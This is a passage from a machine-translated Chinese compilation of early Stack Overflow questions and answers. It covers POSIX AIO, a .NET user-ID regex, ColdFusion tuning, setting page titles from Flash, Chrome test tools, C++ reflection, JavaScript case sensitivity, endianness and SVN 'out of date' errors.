但是，如果您使用 JavaScript 并找到 Ogre3D 的 HTML5 版本，您应该能够将您的游戏代码直接移植到 Web 版本中，而只需进行最少的（如果有的话）更改。

这两个都是不错的选择，各有利弊，但两者肯定都是最容易学习的，因为您可能已经在使用 C++ 工作。如果您正在使用 Java，则可能同样如此，如果它是 Game Maker，则您不需要任何一个，除非您尝试制作人们不需要 Game Maker 本身来运行的可执行文件，其中案例，祝你好运找到运行其中任何一个的扩展。

# linux - POSIX 异步 I/O (AIO) 的现状如何？

> ID：87892
> 
> 赞同：96
> 
> 时间：2008-09-17T21:32:25.490
> 
> 标签：linux, asynchronous, posix, bsd, aio

网络上散布着一些页面，它们以不同的详细程度描述了 POSIX AIO 设施。它们都不是最近的。目前尚不清楚他们到底在描述什么。例如，[此处用于 Linux 内核异步 I/O 支持的“官方”（？）网站](http://lse.sourceforge.net/io/aio.html)说套接字不起作用，但我的 Ubuntu 8.04.1 工作站上的“aio.h”手册页似乎都暗示了这一点它适用于任意文件描述符。然后还有[另一个项目似乎在库层工作，](http://www.bullopensource.org/posix/)文档更少。

我想知道：

*   POSIX AIO 的目的是什么？鉴于我能找到的最明显的实现示例说它不支持套接字，整个事情对我来说似乎很奇怪。它只是用于异步磁盘 I/O 吗？如果是这样，为什么要使用超通用 API？如果不是，为什么磁盘 I/O 首先受到攻击？
*   *我可以在哪里查看完整*的POSIX AIO 程序示例？
*   真的有人用过吗？
*   哪些平台支持 POSIX AIO？他们支持其中的哪些部分？`<aio.h>`是否有人真正支持似乎承诺的暗示的“任何 FD 的任何 I/O” ？

我可以使用的其他多路复用机制非常好，但是那里漂浮的随机信息片段让我很好奇。

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2011-03-15T04:30:59.297

使用 kqueue、epoll、IO 完成端口等解决了高效的套接字 I/O。执行异步文件 I/O 有点迟到（除了 windows 的重叠 I/O 和 solaris 对 posix AIO 的早期支持）。

如果您正在寻找套接字 I/O，您可能最好使用上述机制之一。

因此，AIO 的主要目的是解决异步磁盘 I/O 的问题。这很可能是为什么 Mac OS X 只支持常规文件的 AIO，而不支持套接字（因为 kqueue 无论如何都做得更好）。

写操作通常由内核缓存并在以后刷新。例如，当驱动器的读取头碰巧经过要写入块的位置时。

但是，对于读取操作，如果您希望内核对读取进行优先级排序，AIO 确实是唯一的选择。这就是内核可以（理论上）比任何用户级应用程序做得更好的原因：

*   内核可以查看所有磁盘 I/O，而不仅仅是您的应用程序磁盘作业，并且可以在全局级别对它们进行排序
*   内核（可能）知道磁盘读取头在哪里，并且可以按照最佳顺序选择您传递给它的读取作业，以将磁头移动最短距离
*   内核可以利用[*本机命令队列*](http://en.wikipedia.org/wiki/Native_Command_Queuing)来进一步优化您的读取操作
*   与使用 readv() 相比，使用 lio_listio() 可以为每个系统调用发出更多的读取操作，特别是如果您的读取不是（逻辑上）连续的，从而节省了一点系统调用开销。
*   使用 AIO，您的程序可能会稍微简单一些，因为您不需要额外的线程来阻止读取或写入调用。

也就是说，posix AIO 有一个非常尴尬的界面，例如：

*   事件回调唯一有效且支持良好的方法是通过信号，这使得它很难在库中使用，因为这意味着使用来自进程全局信号命名空间的信号编号。如果您的操作系统不支持实时信号，这也意味着您必须遍历所有未完成的请求以找出实际完成的请求（例如，Mac OS X 就是这种情况，而不是 Linux）。在多线程环境中捕获信号也会产生一些棘手的限制。您通常不能对信号处理程序中的事件做出反应，但您必须发出信号、写入管道或使用 signalfd()（在 linux 上）。
*   lio_suspend() 与 select() 有相同的问题，它不能很好地随着工作的数量而扩展。
*   lio_listio() 已实现，您可以传入的作业数量相当有限，并且以可移植的方式找到此限制并非易事。您必须调用 sysconf(_SC_AIO_LISTIO_MAX)，这可能会失败，在这种情况下，您可以使用 AIO_LISTIO_MAX 定义，它不一定定义，但是您可以使用 2，它被定义为保证支持。

至于使用 posix AIO 的实际应用程序，您可以看看 lighttpd (lighty)，它在引入支持时也发布了[性能测量。](http://blog.lighttpd.net/articles/2006/11/12/lighty-1-5-0-and-linux-aio)

目前大多数 posix 平台都支持 posix AIO（Linux、BSD、Solaris、AIX、tru64）。Windows 通过其重叠的文件 I/O 支持它。我的理解是只有 Solaris、Windows 和 Linux 真正支持异步。文件 I/O 一直到驱动程序，而其他操作系统则模拟异步。带有内核线程的 I/O。Linux 是个例外，它在 glibc 中的 posix AIO 实现模拟用户级线程的异步操作，而它的本机异步 I/O 接口（io_submit() 等）在驱动程序支持的情况下一直是真正异步的.

我相信操作系统中不支持任何 fd 的 posix AIO 是相当普遍的，但将其限制为常规文件。

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2008-09-17T23:15:51.280

网络 I/O 不是 AIO 的优先事项，因为每个编写 POSIX 网络服务器的人都使用基于事件的非阻塞方法。老式的 Java “数十亿个阻塞线程”方法非常糟糕。

磁盘写入 I/O 已经缓冲，磁盘读取 I/O 可以使用 posix_fadvise 等函数预取到缓冲区中。这使得直接的、无缓冲的磁盘 I/O 成为 AIO 的唯一有用用途。

直接的、无缓冲的 I/O 仅对事务数据库真正有用，并且那些倾向于编写自己的线程或进程来管理其磁盘 I/O。

因此，最终使 POSIX AIO 处于不提供**任何**有用目的的位置。不要使用它。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-10-26T15:29:36.813

libtorrent 开发人员对此提供了一份报告： http: [//blog.libtorrent.org/2012/10/asynchronous-disk-io/](http://blog.libtorrent.org/2012/10/asynchronous-disk-io/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-10-27T08:40:53.577

有 aio_write - 在 glibc 中实现；aio_read 或 aio_write 函数的第一次调用会产生许多用户模式线程，aio_write 或 aio_read 向该线程发送请求，线程执行 pread/pwrite 并且当它完成时，答案将被发送回阻塞的调用线程。

还有“真正的”aio - 内核级别支持（需要 libaio，请参阅 io_submit 调用[http://linux.die.net/man/2/io_submit](http://linux.die.net/man/2/io_submit)）；还需要 O_DIRECT （也可能不是所有文件系统都支持，但主要的确实支持它）

看这里：

[http://lse.sourceforge.net/io/aio.html](http://lse.sourceforge.net/io/aio.html)

[http://linux.die.net/man/2/io_submit](http://linux.die.net/man/2/io_submit)

[Linux 上 POSIX AIO 和 libaio 的区别？](https://stackoverflow.com/questions/8768083/difference-between-posix-aio-and-libaio-on-linux)

# regex - 正则表达式匹配 name1.name2[.name3]

> ID：87902
> 
> 赞同：1
> 
> 时间：2008-09-17T21:33:31.870
> 
> 标签：regex

我正在尝试验证用户 ID 是否与示例匹配：

```
smith.jack or smith.jack.s 
```

换句话说，任意数量的非空白字符（点除外），紧跟一个点，后跟任意数量的非空白字符（点除外），可选地紧跟一个点，后跟任意数量的非空白字符（点除外）。除了允许连续的点之外，我想出了几种工作正常的变体！例如，下面的正则表达式

```
^([\S][^.]*[.]{1}[\S][^.]*|[\S][^.]*[.]{1}[\S][^.]*[.]{1}[\S][^.]*)$ 
```

匹配 "smith.jack" 和 "smith.jack.s" 但也匹配 "smith..jack" "smith..jack.s" ！我的天哪，它甚至喜欢将点作为第一个字符。看起来编码很简单，但事实并非如此。我正在使用.NET，顺便说一句。

令人沮丧。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-17T21:36:12.503

这有帮助吗？

```
/^[^\s\.]+(?:\.[^\s\.]+)*$/ 
```

或者，在扩展格式中，带有注释（红宝石风格）

```
/
  ^           # start of line
  [^\s\.]+    # one or more non-space non-dot
  (?:         # non-capturing group
    \.        # dot something
    [^\s\.]+  # one or more non-space non-dot
  )*          # zero or more times
  $           # end of line
/x 
```

您不清楚可以使用 dot-something 多少次，但您可以将 dot-something 替换为`*`or `{1,3}`something，以指定允许重复多少次。

我可能应该明确指出，斜杠是 ruby​​（以及 perl 和 js 等）中的文字正则表达式分隔符。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:38:59.047

您正在使用 * 重复，它允许给定组件的 0 次迭代。

您应该使用加号，并将最后的 .[^.]+ 放入一个组，然后是 ? 表示额外集合的可能性。

可能没有完美的语法，但类似于以下内容的东西应该可以工作。

^[^.\s]+[.][^.\s]+([.][^.\s]+)?$

或者简单来说，任何非零数量的非空白非点字符，后跟一个点，然后是任何非零数量的非空白非点字符，可选地后跟一个点，然后是任何非- 零个非空白非点字符。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T21:46:40.183

^([^.\s]+)\.([^.\s]+)(?:\.([^.\s]+))?$

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-09-17T21:52:05.537

我不熟悉.NET 的正则表达式。这将在 Perl 中完成您想要的操作。

```
/^\w+\.\w+(?:\.\w+)?$/ 
```

如果 .NET 不支持非捕获`(?:xxx)`语法，请改用：

```
/^\w+\.\w+(\.\w+)?$/ 
```

注意：我假设当您说“非空白，非点”时，您的真正意思是“单词字符”。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-09-17T21:57:59.597

我意识到这已经解决了，但我发现[Regexpal](http://regexpal.com/)对 regex 的原型设计非常有帮助。该网站有大量对基础知识的简单解释，并让您在调整表达式时查看匹配的内容。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-09-17T21:35:34.297

```
[^\s.]+\.[^\s.]+(\.[^\s.]+)? 
```

顺便说一句，您所要求的允许“。” 和 ”..”

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:36:21.723

我认为你会受益于使用 + 表示“1 或更多”，而不是 * 表示“任何数字，包括零”。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:40:14.957

```
(^.)+|(([^.]+)[.]([^.]+))+ 
```

但这将匹配 xyzabc 并且根据您的描述，我不确定这是否足够严格。

顺便说一句：如果我犯了一个愚蠢的错误，请随时修改（我没有使用过 .NET，但已经做了很多正则表达式）

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-17T21:41:44.783

```
[^.\s]+\.[^.\s]+(\.([^\s.]+?)? 
```

有无与伦比的父母。如果更正为

```
[^.\s]+\.[^.\s]+(\.([^\s.]+?))? 
```

还是太自由了。匹配 ab 以及 abcd 和 .ab
如果更正为

```
[^.\s]+\.[^.\s]+(\.([^\s.]+?)?) 
```

与 ab 不匹配

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T21:42:05.420

```
^([^.\W]+)\.?([^.\W]+)\.?([^.\W]+)$ 
```

这应该按照描述捕获，对 id 的部分进行分组并停止重复周期

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-09-17T21:56:05.607

我采取了稍微不同的方法。我想你真的只是想要一串非空格字符，后跟一个点，但那个点是可选的（对于最后一个条目）。然后你想要这个重复。

```
^([^\s\.]+\.?)+$ 
```

现在，这意味着您必须至少有一个字符串，例如“smith”才能匹配。你当然可以限制它只允许一到三个重复

```
^([^\s\.]+\.?){1,3}$ 
```

我希望这会有所帮助。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-09-18T17:37:54.610

[RegexBuddy](http://www.regexbuddy.com/)是一个很好的（非免费）正则表达式工具

# coldfusion - ColdFusion 模板请求计数优化

> ID：87904
> 
> 赞同：5
> 
> 时间：2008-09-17T21:33:37.033
> 
> 标签：coldfusion, administration

在 ColdFusion 中，在管理员的请求调整下，我如何确定最大同时模板请求数的最佳数量（或至少是一个好的猜测）？

环境：
CF8 Standard
IIS 6
Win2k3
SQL2k5 on a单独的盒子

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-17T23:05:35.550

找到正确数量的请求的方法是负载测试。也就是说，当您改变请求数时，测量负载下吞吐量的变化。任何重大变化都需要重新测试。但我怀疑大多数人都会对这么多的工作犹豫不决。

我认为一个好的经验法则是每个 CPU（核心）大约 8 个线程。

就效率而言，线程数越少（在一定程度上），CPU 处理您的请求时进行的交换就越少。如果您的页面执行得非常快，那么较少的请求数是最佳的。

如果您有更长的运行请求，特别是如果您有正在等待第三方（如数据库）的请求，那么增加工作线程的数量将提高您的吞吐量。也就是说，如果你的 CPU 没有被占用处理的东西，你可以承受更多的并发请求处理手头的任务。

尽管它有点过时，但 Grant Straker 关于[CF Performance & Troubleshooting](http://www.cfperformance.com/)的书中关于请求调整的许多原则都是值得的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-18T18:32:35.650

*我会说每个核心*至少 8个，而不是每个 CPU。而且我认为考虑到现代 CPU 内核，8 有点低，我会说至少 12。

# apache-flex - 从 SWF 设置页面标题

> ID：87909
> 
> 赞同：3
> 
> 时间：2008-09-17T21:34:29.947
> 
> 标签：apache-flex, flash

当它只是一个加载的 SWF 时，是否可以设置页面的标题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-09-18T11:27:00.023

我会这样做：

```
ExternalInterface.call("document.title = 'Hello World'"); 
```

或更笼统地说：

```
function setPageTitle( newTitle : String ) : void {
  var jsCode : String = "function( title ) { document.title = title; }";

  ExternalInterface.call(jsCode, newTitle);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:58:02.730

当然。这应该可以解决您的问题：

```
getURL('javascript:var x = (document.getElementsByTagName("head")[0].getElementsByTagName("title")[0].firstChild.nodeValue = "This is a test!");'); 
```

只需替换“这是一个测试！” 用你的新头衔。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-01-15T07:26:43.707

我想出了设置页面标题的相同问题。Madw 从下载 aspFlash 控件到那些 swfObject 中付出了很多努力....

最后，我的团队负责人提出了解决方案....

打开一个页面的弹出窗口，在该页面中使用一个 IFrame 并使用 Iframe 加载 swf 文件。

所以有 2 页外层是我们的控件，所以只需设置标题.. 内层是 iframe，它只是另一个页面，所以通过设置 scr="*文件路径*"直接加载 swf 文件

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T00:33:45.680

You could use [SWFAddress](http://www.asual.com/swfaddress/), it has a setTitle method. Plus, you get the added benefit of beng able to modify the URL for deep-linking.

EDIT: This won't work if the SWF is loaded directly in the browser, only if it is embedded in HTML.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:43:16.057

我想你能做到。您必须访问 javascript DOM。

几个链接可能会引导您走上正确的道路..

[http://homepage.ntlworld.com/kayseycarvey/document2.html](http://homepage.ntlworld.com/kayseycarvey/document2.html)

[http://www.permadi.com/tutorial/flashjscommand/](http://www.permadi.com/tutorial/flashjscommand/)

# google-chrome - 用于在 Google Chrome 浏览器中进行自动化 Web 应用测试的工具/框架？

> ID：87911
> 
> 赞同：7
> 
> 时间：2008-09-17T21:34:50.057
> 
> 标签：google-chrome, testing, browser

开源/商业工具/框架是否可用于在 Windows XP / Vista 上的 Google Chrome 浏览器中进行自动化 Web 应用程序测试？（一个 alpha/beta 工具也可以）

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-09-17T21:41:05.890

Selenium 开箱即用地支持 Chrome，因为它通过在网页中注入 javascript 来工作。[http://selenium-rc.openqa.org/](http://selenium-rc.openqa.org/)

Webdriver 有一个早期版本的 Chrome 驱动程序。[http://code.google.com/p/webdriver/](http://code.google.com/p/webdriver/)

两者都是开源的，可以在 Windows 上运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-11T13:14:40.487

我找到了一个名为 QA Agent ( [http://qaagent.com](http://qaagent.com) ) 的工具。这是一个基于 Web 的 IDE，您可以在其中使用 jQuery 和 javascript 开发测试。目前它仅支持 Chrome，所以它可能是您的一个不错的选择。当然，它是免费的。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2017-07-11T17:08:41.797

对于那些不是开发人员的人，您可以尝试[FRET](https://www.frontendtest.org)使用 Chrome 进行自动化 Web 测试。它仍处于测试阶段，尽管它声明不需要编程，但建议您对 HTML / CSS 等有基本的了解。

# c++ - C++ 的属性和反射库？

> ID：87932
> 
> 赞同：19
> 
> 时间：2008-09-17T21:36:58.960
> 
> 标签：c++, reflection, attributes

大多数成熟的 C++ 项目似乎都有自己的**反射和属性系统**，即用于定义可以通过字符串访问并自动序列化的属性。至少我参与的许多 C++ 项目似乎都在**重新发明轮子**。

您是否知道任何支持反射和属性容器的 C++**开源库，特别是：**

*   通过宏定义 RTTI 和属性
*   通过代码访问 RTTI 和属性
*   属性的自动序列化
*   监听属性修改（例如 OnValueChanged）

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2010-06-16T08:24:08.247

有一个使用完全不同的方法在 C++ 中提供反射的新项目：**CAMP**。 [https://github.com/tegesoft/camp](https://github.com/tegesoft/camp)

CAMP 不使用预编译器，classes/properties/functions/... 是使用类似于 boost.python 或 luabind 的语法手动声明的。当然，如果他们愿意，人们可以使用像 gccxml 或 open-c++ 这样的预编译器来生成这个声明。

它仅基于纯 C++ 和 boost 头文件，并且由于模板元编程的强大功能，它支持任何类型的可绑定实体（例如，继承和奇怪的构造函数不是问题）。

它是根据 MIT 许可证（以前的 LGPL）分发的。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-09-17T22:09:55.260

这就是当 C++ 遇到反射时你得到的：

![C++ 遇到反射](https://i.stack.imgur.com/alBDj.jpg)

无论您选择什么，它都可能有可怕的宏、难以调试的代码或奇怪的构建步骤。我见过一个系统自动从 DevStudio 的 PDB 文件生成序列化代码。

不过说真的，对于小型项目，编写保存/加载函数（或使用流操作符）会更容易。事实上，这也可能适用于大型项目 - 很明显发生了什么，如果结构发生变化，您通常需要更改代码。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-09-17T22:11:01.560

你可以看看下面的两个工具。我从来没有使用过它们中的任何一个，所以我不能告诉你它们有多实用。

**[XRTTI](http://www.ischo.com/xrtti/)**：

> Xrtti 是一个工具和附带的 C++ 库，它扩展了 C++ 的标准运行时类型系统，以提供更丰富的关于类和方法的反射信息集来操作这些类及其成员。

**[开放C++](http://opencxx.sourceforge.net/)**：

> OpenC++ 是 C++ 前端库（lexer+parser+DOM/MOP）和源到源的翻译器。OpenC++ 支持开发 C++ 语言工具、扩展、特定领域的编译器优化和运行时元对象协议。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2010-03-21T05:09:21.177

我看了这些东西很长一段时间，但它们往往是非常严厉的。它们可能会阻止您使用继承，或者使用奇怪的构造函数等。最后，它们最终成为太多的负担而不是便利。

我现在使用的这种公开成员的方法非常轻量级，例如，您可以探索一个用于序列化的类或将所有名为“x”的字段设置为 0。它也是静态确定的，因此非常非常快。无需担心会干扰构建过程的库代码或代码生成层。它概括为嵌套类型的层次结构。

使用一些宏设置您的编辑器以自动编写其中一些内容。

```
struct point
{
     int x;
     int y;

     // add this to your classes
     template <typename Visitor>
     void visit(Visitor v)
     {
         v->visit(x, "x"); 
         v->visit(y, "y");
     }
};

/** Outputs any type to standard output in key=value format */
struct stdout_visitor
{
     template <typename T>
     void visit(const T& rhs)
     {
         rhs.visit(this);
     }

     template <typename Scalar>
     void visit (const Scalar& s, const char* name)
     {
          std::cout << name << " = " << s << " ";
     }
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-09-17T22:00:06.890

这通常是 C++ 语言的一个臭名昭著的弱点，因为需要标准化以使反射实现可移植和有价值的东西不是标准的。我想到了调用约定、对象布局和符号修饰，但还有其他一些。

缺乏来自标准的方向意味着编译器实现者会做一些不同的事情，这意味着很少有人有动力去写一个可移植的反射库，这意味着需要反射的人重新发明轮子，但只是够用了他们需要什么。这种情况会*无限*发生，我们就在这里。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-09-06T07:56:40.913

这个也看了一会儿。当前最简单的解决方案似乎是[BOOST_FUSION_ADAPT_STRUCT](https://stackoverflow.com/q/12084781/362754)。实际上，一旦有了库/头文件，您只需将结构字段添加到 BOOST_FUSION_ADAPT_STRUCT() 宏中，如[代码的最后一段所示](https://stackoverflow.com/a/12102144/362754)。是的，它有许多其他人提到的限制。而且它不直接支持听众。

我研究的其他有希望的解决方案是

*   CAMP 和 XRTTI/gccxml，但是两者似乎都是将外部工具依赖项引入项目的障碍。
*   几年前，我使用 perl [`c2ph`](http://linux.about.com/library/cmd/blcmdl1_c2ph.htm)/[`pstruct`](http://linux.about.com/library/cmd/blcmdl1_pstruct.htm)从 的输出中转储元信息，`gcc -gstabs`虽然它对我来说非常有效，但它的侵入性较小，但需要更多的工作。

关于 boost/__cxa 方法，一旦弄清楚所有小细节，添加/更改结构或字段就很容易维护。我们目前使用它在 dbus 之上构建自定义类型绑定层，以序列化 API 并隐藏托管对象服务子系统的传输/RPC 详细信息。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-09-17T21:53:47.577

不是通用的，但 QT 通过元编译器支持这一点，并且是 GPL。我与 QT 人员交谈的理解是，纯 C++ 无法做到这一点，因此需要 moc。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-03-12T12:25:14.820

自动内省/反思工具包。使用 Qt 之类的元编译器并将元信息直接添加到目标文件中。直观易用。没有外部依赖。甚至允许自动反映 std::string 然后在脚本中使用它。请访问[IDK](https://sites.google.com/site/idevkit/)

# javascript - JavaScript 以及为什么大写字母有时有效，有时无效

> ID：87934
> 
> 赞同：7
> 
> 时间：2008-09-17T21:37:09.067
> 
> 标签：javascript, html, dom, case-sensitive

在 Notepad++ 中，我正在编写一个 JavaScript 文件，但有些东西不起作用：单击按钮时必须显示警报，但它不起作用。

我使用了 Notepad++ 提供的自动完成插件，它为我提供了`onClick`.

当我将资本更改`C`为 small`c`时，它确实有效。

所以首先，在查看自动完成中的函数时，我注意到很多函数都使用大写字母。

但是当你更改`getElementById`为时`getelementbyid`，你也会得到一个错误，更糟糕的是，我学校的手册上所有的东西都是用大写字母写的，但解决方案都是用小写字母写的。

那么 JavaScript 和它对哪些函数可以有大写字母而哪些不能有选择性的本质是什么？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2008-09-17T21:39:47.627

Javascript**总是**区分大小写，而 html 不是。

听起来好像您在谈论 html 属性（例如 onclick）是否区分大小写。答案是属性不区分大小写，但我们通过 DOM 访问它们的方式是。所以，你可以这样做：

```
<div id='divYo' onClick="alert('yo!');">Say Yo</div> // Upper-case 'C' 
```

或者：

```
<div id='divYo' onclick="alert('yo!');">Say Yo</div> // Lower-case 'C' 
```

但是通过 DOM，您必须使用正确的大小写。所以这有效：

```
getElementById('divYo').onclick = function() { alert('yo!'); }; // Lower-case 'C' 
```

但你不能这样做：

```
getElementById('divYo').onClick = function() { alert('yo!'); }; // Upper-case 'C' 
```

编辑：CMS 提出了一个很好的观点，即大多数 DOM 方法和属性都在[camelCase](http://www.perlmonks.org/?node_id=45213)中。想到的一个例外是事件处理程序属性，它们通常被认为是[附加到事件的错误方式](http://javascript.about.com/library/blonclick.htm)。更喜欢使用[`addEventListener`](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)如下：

```
document.getElementById('divYo').addEventListener('click', modifyText, false); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-09-17T22:55:40.627

IE 的一些对象并不总是区分大小写，包括一些/大多数/所有 ActiveX——为什么**XHR.onReadyStateChange**和**XHR.onreadystatechange**在 IE5 或 IE6 中都可以正常工作，但只有后者可以与本机**XMLHttpRequest**对象一起工作在IE7、FF等

但是，“*标准*”API 套管的快速参考：

*   **大写**- 常量（通常是符号，因为**const**不受全局支持）
*   **大写**- 类/对象函数
*   **小写**- 事件
*   **camelCase** - 其他一切

没有 100% 的保证。但是，大多数情况下，这是准确的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:46:19.187

JavaScript API 方法几乎都以小[驼峰](http://en.wikipedia.org/wiki/LowerCamelCase)命名方式调用，并且 JavaScript 区分大小写

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T21:46:27.737

Javascript*应该*始终区分大小写，但我在 Internet Explorer 中看到过一些情况，它允许某些函数名称全部大写，而其他函数名称则不允许。我认为它仅限于 Visual Basic 中也存在的函数，因为解释器之间存在一些奇怪的近亲繁殖。显然应该避免这种行为，除非你的意图是制作只在一个浏览器中运行的代码:)

# macos - 新 Mac 的字节序 - 现在所有的 pc 平台都一样吗？

> ID：87935
> 
> 赞同：14
> 
> 时间：2008-09-17T21:37:11.940
> 
> 标签：macos, endianness

将 mac 换成 Intel 芯片是否意味着我们已经完成了在二进制资源中为跨平台数据分布处理数字的问题？

这是这个问题的最后一个还是我不知道的其他平台？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-09-17T21:50:01.410

您似乎忘记了字节顺序超越了处理器架构。有很多算法和协议需要特定的字节顺序。例如，我花了两周时间试图让 MD5 散列算法工作，结果发现我假设了网络字节顺序（Big Endian），而 Ronald Rivest 假设（在 RFC 中没有说明）实现者会使用 Little Endian 字节顺序。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-09-17T21:51:01.517

好吧，实际上还有很多大端 CPU 剩余。

实际上PPC并没有死。您知道，Xbox360 使用 PPC CPU（这是一个很好的例子，这些 CPU 并不像它们的声誉那么糟糕 - Xbox360 一点也不慢）。好吧，这个可能不算是PC。

但是服务器算不算PC？仍然有很多服务器使用 Sun 的 UltraSparc CPU，通常是大端，尽管最新的型号可以是大端或小端。有许多 CPU 可以是其中之一（例如 ARM，仍然用于许多设备，如手机等），因为支持两者为硬件和软件供应商增加了最大的灵活性。甚至 IA64 CPU（Intanium，在 AMD 发明 x86-64 之前旨在取代 x86，它是真正的 64 位并且只能模拟 32 位，不像 x86-64 可以两者兼而有之）是 CPU 之一切换到大端。可以同时使用的 CPU 称为双端。

实际上，如果您暂时忽略英特尔（和兼容的 CPU），那么市场上的大多数 CPU 要么是大端或至少是双端，尽管据我所知，其中大多数都没有用于任何消费类 PC。

但是，我没有像许多程序员那样看到字节序问题。每个现代 CPU 都可以在硬件中交换字节序。实际上，如果您在小端英特尔 CPU 上编写程序，交换从内存读取的每个整数的字节序，并在写回内存时再次交换，这可能会导致性能损失低至 5%；在实践中，您只需要为进出应用程序的数据交换字节顺序，因为在您的应用程序中，字节顺序是恒定的，当然。

另请注意：我知道的几乎所有网络协议都将字节顺序指定为大端，TCP/IP 是最熟悉的系列。因此，如果您在较低的网络层上工作，您将始终需要继续交换字节。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-07-19T00:53:21.507

我在想同样的问题：既然 Mac 现在是英特尔，那么字节序问题已经死了吗？没有。除了某些超级计算机（让我们面对现实，我们这些外行人永远不必处理）之外，还有一个使用大端顺序的主要领域：**网络协议**，特别是：互联网协议（如：“IP ”的 TCP/IP）。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-09-17T21:41:40.990

这肯定不是这个问题的最后一个问题，特别是如果您正在为嵌入式系统（包括 Pocket PC 等）编写代码。MIPS、ARM 和其他架构支持双端架构，它们可以在系统启动时选择它们的字节序。

如果您正在编写依赖于字节顺序的代码，则需要关心字节序。不要指望这个“问题”很快就会消失。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-09-17T21:50:50.003

讨厌的 x86 用它们的段指针弄脏了我的内存寄存器！;)

我相信您不再需要在 PC 和 Mac 之间翻来覆去，假设您正在回避与 PowerPC 的向后兼容性。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-07-19T01:08:01.683

现在，一个人的主计算机比以往任何时候都更不可能是运行通用操作系统的台式计算机。尽管这仍然很常见，但许多其他人正在使用专门构建的智能手机或 umpc 设备，即用于浏览网络。这些平台不一定有 x86 cpu。更常见的是，尤其是智能手机设备，他们使用的是大端的 ARM 内核。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:49:20.443

定义PC，你认为PC是什么？

我目前正在从运行在 arm 9 处理器上的 Linux 发行版中键入此内容，可以将其设置为不同的字节序，但默认值为大字节序。Intel、AMD 和 Via（x86 兼容）使用 Little endian。

字节序不会很快消失，任何时候你通过网络传输任何东西，你都必须确保它是正确的字节序，因为互联网协议指定的字节序实际上是大字节序。

有关更多信息，请参阅有关字节顺序的[Wikipedia 文章](http://en.wikipedia.org/wiki/Endianness#Endianness_in_networking)。

# svn - 你如何克服 svn 'out of date' 错误？

> ID：87950
> 
> 赞同：345
> 
> 时间：2008-09-17T21:38:50.937
> 
> 标签：svn

我一直在尝试在 Subversion 中将目录结构从一个位置移动到另一个位置，但出现`Item '*' is out of date`提交错误。

我已签出最新版本（据我所知）。`svn st -u`除了 mv 命令之外没有其他差异。

* * *

## 回答 #1

> 赞同：658
> 
> 时间：2008-09-17T21:52:50.433

我有时在 Windows 上使用 TortoiseSVN 得到这个。我的解决方案是`svn update`目录，即使没有要下载或更新的修订。它对元数据做了一些事情，神奇地修复了它。

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2011-01-03T23:33:19.077

在尝试了所有明显的事情以及这里的一些其他建议之后，没有任何运气，谷歌搜索导致了这个链接（链接不再工作） - [Subversion 说：你的文件或目录可能已经过时了](http://pageworthy.com/blog/2009/apr/14/subversion-says-your-file-or-directory-probably-ou/)

简而言之，诀窍是转到**.svn 目录**（在包含有问题文件的目录中），然后**删除“all-wcprops”文件**。

在没有其他事情的时候为我工作。

* * *

## 回答 #3

> 赞同：39
> 
> 时间：2008-09-17T21:49:59.240

我相信这个问题来自 .svn 文件。它在旧父母、新父母或旧父母中都不正确。我会尝试回到你的起点。使用导出来获取文件夹的干净副本。将干净的副本移动到新位置，然后使用添加和删除来进行移动。这是手动执行 SVN 所做的事情，但它可能会起作用。

* * *

## 回答 #4

> 赞同：39
> 
> 时间：2013-01-19T10:30:58.647

我发现这对我有用：

```
svn update
svn resolved <dir>
svn commit 
```

* * *

## 回答 #5

> 赞同：15
> 
> 时间：2009-06-18T03:42:30.823

尝试更新本地副本，并还原有问题的项目，但仍然出现“过时”错误。这出于某种原因起作用：

```
svn update --force /path/to/dir/or/file 
```

* * *

## 回答 #6

> 赞同：11
> 
> 时间：2013-10-31T13:40:44.717

